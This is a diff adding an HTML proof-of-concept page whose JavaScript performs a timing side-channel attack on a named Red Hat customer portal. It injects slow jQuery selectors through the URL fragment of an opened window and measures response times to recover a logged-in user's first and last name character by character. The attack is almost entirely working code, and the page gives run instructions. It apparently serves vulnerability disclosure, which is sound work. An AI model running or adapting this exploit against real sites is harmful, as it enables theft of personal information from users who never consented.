@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <script>
+            const WAIT_TIME = 6;
+            const VICTIM_URL = "https://access.redhat.com/convergence/";
+
+            const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+            function get_execution_time(selector) {
+                var t0 = window.performance.now();
+
+                var p = wait(WAIT_TIME).then(_ => Promise.resolve(measure_time(t0)))
+                win.location = VICTIM_URL + "#x," + selector + ","+Math.random();
+                return p;
+            }
+
+            function measure_time(t0) {
+                var t = window.performance.now() - t0;
+                return t;
+            }
+
+            const SLOW_SELECTOR = "*:has(*:has(*):parent:has(*):parent:has(*):parent:has(*):parent:has(*)):parent:has(";
+            const SELECTOR_TEMPLATE = ".account-user:contains('{}'))";
+
+            async function binary_search(prefix, characters, firstNameFlag) {
+                console.log("Testing '" + characters + "'");
+                if (characters.length == 1) {
+                    return characters[0];
+                }
+
+                var mid = Math.floor(characters.length/2);
+                var s1 = make_selector(prefix, characters.slice(0, mid), firstNameFlag);
+                var s2 = make_selector(prefix, characters.slice(mid, characters.length), firstNameFlag);
+
+                var t1 = await get_execution_time(s1);
+                var t2 = await get_execution_time(s2);
+                console.log("Execution time 1:"+t1);
+                console.log("Execution time 2:"+t2);
+                if (approximately_equal(t1, t2)) {
+                    return null;
+                }
+                else if (t1 < t2) {
+                    return binary_search(prefix, characters.slice(mid, characters.length), firstNameFlag);
+                }
+                else {
+                    return binary_search(prefix, characters.slice(0, mid), firstNameFlag);
+                }
+            }
+
+            function make_selector(prefix, characters, firstNameFlag, firstName) {
+                return characters
+                    .split("")
+                    .map(c => !firstNameFlag ? SLOW_SELECTOR + SELECTOR_TEMPLATE.replace('{}',  c + prefix + '\\000020') : SLOW_SELECTOR + SELECTOR_TEMPLATE.replace("{}",  prefix.replace(/ /, '\\000020') + c))
+                    .join(",");
+            }
+
+            function approximately_equal(t1, t2) {
+                var diff = Math.abs(t1 - t2);
+                return diff <= 0.2*t1 || diff <= 0.2*t2;
+            }
+
+            const CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+            async function bruteforce_name() {
+                var backtracks = 0;
+                var t0 = window.performance.now();
+                var misses = 0;
+                var name = "";
+                var firstNameFlag = false;
+                var lastChar = '';
+                while (true) {
+                    if(!firstNameFlag && /[A-Z]/.test(name)) {
+                      firstNameFlag = true;
+                      name += ' ';
+                      backtracks = 0;
+                      continue;
+                    }
+                    var c = await binary_search(name, CHARS, firstNameFlag);
+                    if (c === null) {
+                        misses++;
+                        if (misses == 3) {
+                            if(!firstNameFlag) {
+                              name = name.slice(1); // Backtrack
+                            } else {
+                              if(/\s$/.test(name)) {
+                                continue;
+                              }
+                              name = name.slice(0, -1); // Backtrack
+                            }
+                            backtracks++;
+                        }
+                        if(backtracks > 5) {
+                          name += lastChar;
+                          break;
+                        }
+                    }
+                    else {
+                        if(!firstNameFlag) {
+                          name = c + name;
+                        } else {
+                          name += c;
+                        }
+                        lastChar = c;
+                        misses = 0;
+                    }
+                    document.getElementById("name").innerHTML = name;
+                }
+
+                document.getElementById("name").innerHTML = name;
+                var elapsed = window.performance.now() - t0;
+                return {name, elapsed, backtracks};
+            }
+
+            async function poc() {
+                window.win = open(VICTIM_URL);
+                await wait(5000);
+                bruteforce_name().then(({name, elapsed, backtracks}) => {
+                    wait(0).then(_ => alert("Found " + name + " in " + elapsed/1000 + " seconds"));
+                });
+            }
+        </script>
+
+        <style>
+.box {
+    margin: 5px;
+    background: rgba(20, 20, 20, 0.8);
+    color: #ddd;
+    padding: 2px;
+    border-radius: 5px;
+}
+#name {
+    position: fixed;
+    bottom: 2px;
+    left 2px;
+}
+        </style>
+    </head>
+
+    <body>
+
+        <h1>Stealing information using jQuery selectors</h1>
+
+        <p>This PoC steals user information such as first and second name using timing attacks and jQuery selectors.</p>
+
+        <ol>
+            <li><b>Please use Firefox</b></li>
+            <li>Login to <a href="https://access.redhat.com/convergence/" target="x">Redhat.com</a></li>
+            <li>Start <a href="#" onclick="poc()">PoC</a></li>
+        </ol>
+        <div class="box" id="name"></div>
+    
+
+</body></html>
